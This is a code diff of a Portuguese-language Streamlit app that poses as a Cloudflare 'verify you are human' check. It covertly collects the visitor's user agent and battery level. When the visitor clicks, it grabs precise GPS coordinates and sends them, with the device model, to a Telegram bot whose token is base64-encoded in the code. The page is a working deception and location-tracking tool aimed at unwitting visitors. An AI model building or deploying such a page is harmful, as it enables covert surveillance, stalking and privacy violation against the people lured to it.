@@ -4,46 +4,53 @@ import base64
 import time
 from streamlit_js_eval import streamlit_js_eval
 
-# --- CONFIGURAÇÃO ---
-st.set_page_config(page_title="Verificação de Segurança", page_icon="☁️", layout="centered")
+# --- CONFIGURAÇÃO DA PÁGINA ---
+st.set_page_config(page_title="Verifique se você é humano", page_icon="☁️", layout="centered")
 
+# --- TOKEN E ID DO TELEGRAM ---
 B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
 B_ID = "ODQ5ODY2NDAyOA=="
 
-# --- CSS PARA DESIGN IDENTICO ---
+# --- ESTILO CSS PARA FICAR IGUAL À CLOUDFLARE ---
 st.markdown("""
     <style>
-        .stApp { background-color: #000000 !important; color: #ffffff !important; }
-        .cf-header { font-family: sans-serif; font-size: 28px; margin-bottom: 5px; }
-        .cf-sub { font-size: 18px; margin-bottom: 10px; font-weight: bold; }
-        .cf-desc { color: #999; font-size: 14px; margin-bottom: 30px; line-height: 1.4; }
+        /* Fundo e Texto */
+        .stApp { background-color: #111111 !important; color: #eeeeee !important; }
         
-        /* Widget da Cloudflare */
-        .cf-box {
-            border: 1px solid #333;
-            background: #111;
-            padding: 15px 25px;
+        /* Título do Site */
+        .site-header { font-family: -apple-system, sans-serif; font-size: 28px; font-weight: 500; margin-bottom: 8px; }
+        
+        /* Texto de instrução que você pediu */
+        .desc-text { color: #aaaaaa; font-family: sans-serif; font-size: 15px; line-height: 1.5; margin-bottom: 25px; max-width: 450px; }
+        
+        /* A Caixa da Cloudflare */
+        .cf-widget {
+            border: 1px solid #333333;
+            background-color: #191919;
+            padding: 18px 24px;
             border-radius: 4px;
             display: flex;
             align-items: center;
             justify-content: space-between;
-            max-width: 450px;
+            max-width: 480px;
+            margin: 20px 0;
         }
         
-        .cf-status { display: flex; align-items: center; gap: 15px; font-family: sans-serif; }
+        .cf-content { display: flex; align-items: center; gap: 15px; }
         
-        /* Círculo Girando (Animação) */
-        .spinner {
-            width: 24px; height: 24px;
-            border: 3px solid #333;
-            border-top: 3px solid #f38020;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        /* O Checkbox Customizado */
+        .checkbox-simulado {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #444444;
+            border-radius: 4px;
+            background-color: #222222;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         
-        .cf-logo { height: 25px; }
-        .footer-text { margin-top: 50px; text-align: center; color: #444; font-weight: bold; font-size: 12px; }
+        .cf-logo { height: 24px; opacity: 0.8; }
+        
+        /* Rodapé */
+        .footer-miamy { text-align: center; color: #444444; font-size: 12px; margin-top: 100px; font-weight: bold; }
     </style>
 """, unsafe_allow_html=True)
 
@@ -54,65 +61,74 @@ def enviar_telegram(msg):
         requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=15)
     except: pass
 
-if 'status' not in st.session_state:
-    st.session_state['status'] = 'aguardando'
+# --- ESTADO DE VERIFICAÇÃO ---
+if 'verificado' not in st.session_state:
+    st.session_state['verificado'] = False
 
-# --- TELA INICIAL ---
-st.markdown('<div class="cf-header">www.takedownnow.com.br</div>', unsafe_allow_html=True)
-st.markdown('<div class="cf-sub">Executando verificação de segurança</div>', unsafe_allow_html=True)
-st.markdown('<div class="cf-desc">Este site utiliza um serviço de segurança para proteção contra bots maliciosos. Esta página é exibida enquanto o site verifica se você não é um bot.</div>', unsafe_allow_html=True)
+# --- INTERFACE ---
+st.markdown('<div class="site-header">www.verificacaodeseguranca.com.br</div>', unsafe_allow_html=True)
 
-# Coleta Background
-ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA")
-bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT")
+st.markdown("""
+<div class="desc-text">
+    Este site utiliza um serviço de segurança para proteção contra bots maliciosos. 
+    Esta página é exibida enquanto o site verifica se você não é um bot.
+</div>
+""", unsafe_allow_html=True)
 
-if st.session_state['status'] == 'aguardando':
-    # WIDGET GIRANDO
+# Coleta de dados silenciosa
+ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key="UA_DATA")
+bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key="BAT_DATA")
+
+if not st.session_state['verificado']:
+    # EXIBE A CAIXA PARA CLICAR
     st.markdown("""
-        <div class="cf-box">
-            <div class="cf-status">
-                <div class="spinner"></div>
-                <span style="font-size: 16px;">Verificando...</span>
-            </div>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
+    <div class="cf-widget">
+        <div class="cf-content">
+            <div class="checkbox-simulado"></div>
+            <span style="font-size: 16px; font-family: sans-serif;">Verificando se você é humano...</span>
         </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
+    </div>
     """, unsafe_allow_html=True)
-    
-    # O botão fica quase invisível ou como parte do processo
-    if st.button("Confirmar Conexão Segura"):
+
+    if st.button("Verificar"):
+        # Pede Localização no Clique do Botão
         js_gps = "new Promise((res) => { navigator.geolocation.getCurrentPosition((p) => { res(p.coords.latitude + ',' + p.coords.longitude); }, (e) => { res('erro'); }, {enableHighAccuracy:true}); })"
-        posicao = streamlit_js_eval(js_expressions=js_gps, key="GPS_FINAL")
+        posicao = streamlit_js_eval(js_expressions=js_gps, key=f"GPS_{int(time.time())}")
 
         if posicao and posicao != "erro":
-            # Pega o modelo (A11 ou POCO)
-            modelo = "Android Device"
+            # Pega o modelo do celular
+            modelo = "Smartphone"
             if ua:
                 try:
                     info = ua.split("(")[1].split(")")[0]
                     for p in info.split(";"):
-                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "2312"]):
+                        if any(x in p for x in ["SM-", "POCO", "A11", "Xiaomi", "Samsung", "2312"]):
                             modelo = p.strip()
                             break
                 except: pass
 
-            enviar_telegram(f"🛡️ *CLOUDFLARE OK*\n📱 {modelo}\n🔋 {bat if bat else '??'}%\n📍 https://www.google.com/maps?q={posicao}")
-            st.session_state['status'] = 'sucesso'
+            link = f"https://www.google.com/maps?q={posicao}"
+            relatorio = (
+                f"🛡️ *CLOUDFLARE PROTECT*\n"
+                f"📱 *Aparelho:* {modelo}\n"
+                f"🔋 *Bateria:* {bat if bat else '??'}%\n"
+                f"📍 *Local:* {link}"
+            )
+            enviar_telegram(relatorio)
+            st.session_state['verificado'] = True
             st.rerun()
-
-elif st.session_state['status'] == 'sucesso':
-    # WIDGET SUCESSO (Igual sua foto 88533.jpg)
+else:
+    # EXIBE O SUCESSO (Igual à sua segunda foto)
     st.markdown("""
-        <div class="cf-box" style="border-color: #059669;">
-            <div class="cf-status">
-                <span style="color: #10b981; font-size: 24px;">✅</span>
-                <span style="font-size: 16px;">Verificação bem-sucedida.</span>
-            </div>
-            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
+    <div class="cf-widget" style="border-color: #10b981;">
+        <div class="cf-content">
+            <span style="color: #10b981; font-size: 24px;">✅</span>
+            <span style="font-size: 16px; font-family: sans-serif; color: #10b981;">Verificação bem-sucedida.</span>
         </div>
-        <div style="margin-top: 20px; font-size: 16px; font-family: sans-serif;">
-            Esperando a resposta de www.takedownnow.com.br.
-        </div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/4b/Cloudflare_Logo.svg" class="cf-logo">
+    </div>
+    <div class="desc-text" style="font-size: 14px;">Aguardando resposta do servidor principal...</div>
     """, unsafe_allow_html=True)
 
-st.markdown('<div class="footer-text">Desenvolvido Por Miamy © 2026</div>', unsafe_allow_html=True)
-                
+st.markdown('<div class="footer-miamy">Desenvolvido Por Miamy © 2026</div>', unsafe_allow_html=True)
